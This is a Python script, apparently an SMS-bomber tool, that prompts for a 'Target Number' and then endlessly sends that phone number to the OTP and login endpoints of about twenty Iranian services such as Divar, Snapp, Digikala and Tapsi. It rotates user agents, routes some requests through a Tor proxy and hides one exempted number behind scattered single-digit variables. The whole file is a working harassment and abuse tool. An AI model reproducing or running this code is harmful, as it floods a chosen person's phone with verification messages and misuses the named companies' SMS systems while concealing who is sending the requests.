import random
e = ("4")
import time
g = ("6")
import os
b = ("1")
from os import system , name
j = ("9")
import requests
i = ("8")
from colorama import Fore
d = ("3")
def clear():
    if name == "nt":
        _ = system("cls")
    
    else:
        _ = system("clear")


baner = (Fore.BLUE+"""
   *                               
 (  `                )     (       
 )\))(    (       ( /(   ) )\(     
((_)()\  ))\ (    )\()| /(((_)\ )  
(_()((_)/((_))\ )(_))/)(_))_(()/(  
|  \/  (_)) _(_/(| |_((_)_| |)(_)) 
| |\/| / -_) ' \))  _/ _` | | || | 
|_|  |_\___|_||_| \__\__,_|_|\_, | 
                             |__/                  
""")
h = ("7")
clear()
c = ("2")
print(baner)
print(Fore.RED+"Enter Target Number" + Fore.GREEN + "\n________________" "\n|With Out 0    |" )
f = ("5")
number = input("|--->")
a = ("0")
A = j+b+j+f+g+g+d+f+a+b
print("————————————————")
proxy = {"socks5": "127.0.0.1:9050"}
while True:
    if number == A:
        clear()
        print("\n"+Fore.RED+"---------------------------------")
        print(Fore.RED+"| Please Enter Another Number ! |")
        print(Fore.RED+"---------------------------------"+"\n")
        print(baner)
        print(Fore.RED+"Enter Target Number" + Fore.GREEN + "\n________________" "\n|With Out 0    |" )
        number = input("|--->")
        A = j+b+j+f+g+g+d+f+a+b
        print("————————————————")
    elif number == "":
        clear()
        print("\n"+Fore.YELLOW+"---------------------------")
        print(Fore.YELLOW+"| Please enter a number ! |")
        print(Fore.YELLOW+"---------------------------"+"\n")
        print(baner)
        print(Fore.RED+"Enter Target Number" + Fore.GREEN + "\n________________" "\n|With Out 0    |" )
        number = input("|--->")
        A = j+b+j+f+g+g+d+f+a+b
        print("————————————————")
    else:
        clear()
        print(baner)
        #divar
        url_divar = "https://api.divar.ir/v5/auth/authenticate"
        json_divar = {"phone":number}

        #snapp
        url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        json_snapp = {"cellphone":"+98"+number}

        #sheypoor
        url_sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
        json_sheypoor = {"username":"0"+number}

        # snappfood
        # url_snappfood = "https://napi.snapproom.com/users/self/verification-flow"
        # json_snappfood = {"username":"0"+number}

        #digikala
        url_digikala = "https://api.digikala.com/v1/user/authenticate/"
        json_digikala =  {"username":"0"+number}

        #snapproom
        # url_snapproom = "https://napi.snapproom.com/users/self/verification-flow"
        # json_snapproom = {"username":"0"+number}

        # #torob
        # url_torob = "https://api.torob.com/v4/user/phone/send-pin/?"
        # json_torob = {"phone_number":"0"+number} 

        #alibaba
        url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        json_alibaba = {"phoneNumber":number}

        #esam
        url_esam = "https://api.esam.ir/api/account/v2/RegisterOrLogin"
        json_esam = {"mobile":number}

        #timcheh
        url_timcheh = "https://api.timcheh.com/auth/otp/send"
        json_timcheh = {"mobile":"0"+number}

        # #diyanshop
        # url_diyan = "https://dayanshop.com/Auth/CheckPhoneNumber"
        # json_diyan = {"phoneNumber":"0"+number}

        #mobit
        url_mobit = "https://api.mobit.ir/api/web/v8/register/register"
        json_mobit = {"number":"0"+number}

        #kalazem
        url_kalazem = "https://kalazem.com/login?back=my-account"
        json_kalazem = {"username":"0"+number}

        #tapsi
        url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
        json_tapsi = {"credential":{"phoneNumber":"0"+number,"role":"PASSENGER"},"otpOption":"SMS"}

        # #snapp market
        # url_snappm = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="
        # json_snappm = {"cellphone":"0"+number}

        #anten
        url_anten = "https://api2.anten.ir/users"
        json_anten = {"phone":"0"+number}

        # #technolife
        # url_technolife = "https://www.technolife.ir/shop_customer"
        # json_technolife = {"username":"0"+number}

        #digi style
        url_digistyle = "https://www.digistyle.com/tracker/events/"
        json_digistyle = {"username":"0"+number}

        # #snapp shop
        # url_snappshop = "https://api.mediaad.org/v2/events/page/loaded"
        # json_snappshop = {"mobile":"0"+number}

        #whal market
        url_whalmarket = "https://panel.whalemarket.ir/api/user/sendLoginCode"
        json_whalmarket = {"input":"0"+ number }

        #modiseh
        url_modiseh = "https://www.modiseh.com/customer/account/loginpost/"
        json_modiseh = {"username":"0"+number}

        #bony mod
        url_bonymod = "https://mobapi.banimode.com/api/v2/auth/request"
        json_bonymod = {"phone":"0"+number}

        #dgland
        url_dgland = "https://oauth.dgland.tech/api/otp/generate"
        json_dgland = {"phoneNumber":"0"+number}

        # #dakee
        # url_dakee = "https://dakee.ir/wp-admin/admin-ajax.php"
        # json_dakee = {"phone_email":"0"+number}

        #okala
        url_okala = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
        json_okala = {"mobile":"0"+number}

        #techsiro
        url_techsiro = "https://techsiro.com/send-otp"
        json_techsiro = {"mobile":"0"+number}

        heade =[
            { 
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept":"*/*"
            },
            {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept":"application/json, text/plain, */*"
            },
            {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Accept":"application/json, text/plain, */*"
            }
        ]


        while True:
            random_head = random.choice(heade)
            print(Fore.WHITE+"\n------------------------\n"+Fore.RESET)
            #divar
            req = requests.post(url=url_divar,json=json_divar,headers=random_head,proxies=proxy)
            divar = (Fore.GREEN+"[ divar ] : "+Fore.WHITE)
            print(divar , req)
            #os.system("killall -HUP tor")

            #snapp
            req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head,proxies=proxy)
            snapp = (Fore.GREEN+"[ snap ] : "+Fore.WHITE)
            print(snapp , req1)
            #os.system(Fore.WHITE+"killall -HUP tor"+Fore.BLUE)

            #sheypoor
            req2 = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head,proxies=proxy)
            sheypoor = (Fore.GREEN+"[ sheypoor ] : "+Fore.WHITE)
            print(sheypoor , req2)
            #os.system(Fore.WHITE+"killall -HUP tor"+Fore.BLUE)

            #snappfood
            # req3 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head,proxies=proxy)
            # snappfood = (Fore.GREEN+"[ snapfood ] : "+Fore.WHITE)
            # print(snappfood , req3)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #digikala
            req4 = requests.post(url=url_digikala,json=json_digikala,headers=random_head,proxies=proxy)
            digikala = (Fore.GREEN+"[ digikala ] : "+Fore.WHITE)
            print(digikala , req4)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #snapproom
            # req5 = requests.post(url=url_snapproom,json=json_snapproom,headers=random_head,proxies=proxy)
            # snapproom = (Fore.GREEN+"[ snaproom ] : "+Fore.WHITE)
            # print(snapproom , req5)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #torob
            # req6 = requests.get(url=url_torob,json=json_torob,headers=random_head,proxies=proxy)
            # print(req6)
            # os.system(Fore.WHITE+"killall -HUP tor")

            #alibaba
            req7 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head,proxies=proxy)
            alibaba = (Fore.GREEN+"[ alibaba ] : "+Fore.WHITE)
            print(alibaba , req7)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #esam
            req8 = requests.post(url=url_esam,json=json_esam,headers=random_head,proxies=proxy)
            esam = (Fore.GREEN+"[ esam ] : "+Fore.WHITE)
            print(esam , req8)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #timcheh
            req9 = requests.post(url=url_timcheh,json=json_timcheh,headers=random_head,proxies=proxy)
            timcheh = (Fore.GREEN+"[ timcheh ] : "+Fore.WHITE)
            print(timcheh , req9)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #diyanshop
            # req10 = requests.post(url=url_diyan,json=json_diyan,headers=random_head,proxies=proxy)
            # diyanshop = (Fore.GREEN+"[ diyanshop ] : "+Fore.WHITE)
            # print(diyanshop , req10)
            # #os.system(Fore.WHITE+"killall -HUP tor")

            #mobit
            req11 = requests.post(url=url_mobit,json=json_mobit,headers=random_head,proxies=proxy)
            mobit = (Fore.GREEN+"[ mobit ] : "+Fore.WHITE)
            print(mobit , req11)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #kalazem
            req12 = requests.post(url=url_kalazem,json=json_kalazem,headers=random_head,proxies=proxy)
            kalazem = (Fore.GREEN+"[ kalazam ] : "+Fore.WHITE)
            print(kalazem , req12)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #tapsi
            req13 = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head,proxies=proxy)
            tapsi = (Fore.GREEN+"[ tapsi ] : "+Fore.WHITE)
            print(tapsi , req13)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #snapp market
            # req14 = requests.post(url=url_snappm,json=json_snappm,headers=random_head,proxies=proxy)
            # snappmarket = (Fore.GREEN+"[ snapmarket ] : "+Fore.WHITE)
            # print(snappmarket , req14)
            # #os.system(Fore.WHITE+"killall -HUP tor")

            #anten
            req15 = requests.post(url=url_anten,json=json_anten,headers=random_head,proxies=proxy)
            anten = (Fore.GREEN+"[ anten ] : "+Fore.WHITE)
            print(anten , req15)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #technolife
            # req16 = requests.post(url=url_technolife,json=json_technolife,headers=random_head,proxies=proxy)
            # technolife = (Fore.GREEN+"[ technolife ] : "+Fore.WHITE)
            # print(technolife , req16)
            # #os.system(Fore.WHITE+"killall -HUP tor")

            #digi style
            req17 = requests.post(url=url_digistyle,json=json_digistyle,headers=random_head,proxies=proxy)
            digistyle = (Fore.GREEN+"[ digistyle ] : "+Fore.WHITE)
            print(digistyle , req17)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #snapp shop
            # req18 = requests.post(url=url_snappshop,json=json_snappshop,headers=random_head)
            # snappshop = (Fore.GREEN+"[ snapshop ] : "+Fore.WHITE)
            # print(snappshop , req18)
            # #os.system(Fore.WHITE+"killall -HUP tor")

            #whal market
            req19 = requests.post(url=url_whalmarket,json=json_whalmarket,headers=random_head)
            whalmarket = (Fore.GREEN+"[ whalmarket ] : "+Fore.WHITE)
            print(whalmarket , req19)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #modiseh
            req20 = requests.post(url=url_modiseh,json=json_modiseh,headers=random_head)
            modiseh = (Fore.GREEN+"[ modiseh ] : "+Fore.WHITE)
            print(modiseh , req20)
            #os.system(Fore.WHITE+"killall -HUP tor")
            
            #bony mod
            req21 = requests.post(url=url_bonymod,json=json_bonymod,headers=random_head)
            bonymod = (Fore.GREEN+"[ bonymod ] : "+Fore.WHITE)
            print(bonymod , req21)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #dg land
            req22 = requests.post(url=url_dgland,json=json_dgland,headers=random_head)
            dgland = (Fore.GREEN+"[ dgland ] : "+Fore.WHITE)
            print(dgland , req22)
            #os.system(Fore.WHITE+"killall -HUP tor")

            # #dakee
            # req23 = requests.post(url=url_dakee,json=json_dakee,headers=random_head)
            # dakee = (Fore.GREEN+"[ dakee ] : "+Fore.WHITE)
            # print(dakee , req23)
            # #os.system(Fore.WHITE+"killall -HUP tor")

            #okala
            req24 = requests.post(url=url_okala,json=json_okala,headers=random_head)
            okala = (Fore.GREEN+"[ okala ] : "+Fore.WHITE)
            print(okala , req24)
            #os.system(Fore.WHITE+"killall -HUP tor")

            #techsiro
            req25 = requests.post(url=url_techsiro,json=json_techsiro,headers=random_head)
            techsiro = (Fore.GREEN+"[ techsiro ] : "+Fore.WHITE)
            print(techsiro , req25)
            #os.system(Fore.WHITE+"killall -HUP tor")



            time.sleep(0.5)



